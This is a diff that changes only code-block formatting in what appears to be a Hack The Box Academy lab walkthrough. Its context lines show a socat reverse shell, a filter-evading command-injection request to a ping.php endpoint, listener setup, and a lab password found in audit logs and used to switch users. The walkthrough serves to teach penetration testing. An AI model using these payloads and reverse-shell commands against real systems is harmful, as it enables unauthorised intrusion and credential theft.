@@ -10,15 +10,13 @@ Now that we've thoroughly enumerated and attacked the external perimeter and unc
 
 As mentioned in the previous section, we can use [Socat](https://linux.die.net/man/1/socat) to establish a reverse shell connection. Our base command will be as follows, but we'll need to tweak it some to get past the filtering:
 
-```
-        shellsession
+```shellsession
 socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
 ```
 
 We can modify this command to give us a payload to catch a reverse shell.
 
-```
-        shellsession
+```shellsession
 GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1
 Host: monitoring.inlanefreight.local
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
@@ -33,8 +31,7 @@ Connection: close
 
 Start a `Netcat` listener on the port used in the Socat command (8443 here) and execute the above request in Burp Repeater. If all goes as intended, we will have a reverse shell as the `webdev` user.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -nvlp 8443
 
 listening on [any] 8443 ...
@@ -47,15 +44,13 @@ Next, we'll need to upgrade to an `interactive TTY`. This [post](https://blog.ro
 
 We'll start a Socat listener on our attack host.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ socat file:`tty`,raw,echo=0 tcp-listen:4443
 ```
 
 Next, we'll execute a Socat one-liner on the target host.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lnvp 8443
 
 listening on [any] 8443 ...
@@ -65,8 +60,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
 
 If all goes as planned, we'll have a stable reverse shell connection on our Socat listener.
 
-```
-        shellsession
+```shellsession
 webdev@dmz01:/var/www/html/monitoring$ id
 
 uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
@@ -75,8 +69,7 @@ webdev@dmz01:/var/www/html/monitoring$
 
 Now that we've got a stable reverse shell, we can start digging around the file system. The results of the `id` command are immediately interesting. The [Privileged Groups](https://academy.hackthebox.com/module/51/section/477) section of the `Linux Privilege Escalation` module shows an example of users in the `adm` group having rights to read ALL logs stored in `/var/log`. Perhaps we can find something interesting there. We can use [aureport](https://linux.die.net/man/8/aureport) to read audit logs on Linux systems, with the man page describing it as "aureport is a tool that produces summary reports of the audit system logs."
 
-```
-        shellsession
+```shellsession
 webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less
 
 Error opening config file (Permission denied)
@@ -98,8 +91,7 @@ TTY Report
 
 After running the command, type `q` to return to our shell. From the above output, it looks like a user was trying to authenticate as the `srvadm` user, and we have a potential credential pair `srvadm:ILFreightnixadm!`. Using the `su` command, we can authenticate as the `srvadm` user.
 
-```
-        shellsession
+```shellsession
 webdev@dmz01:/var/www/html/monitoring$ su srvadm
 
 Password: 
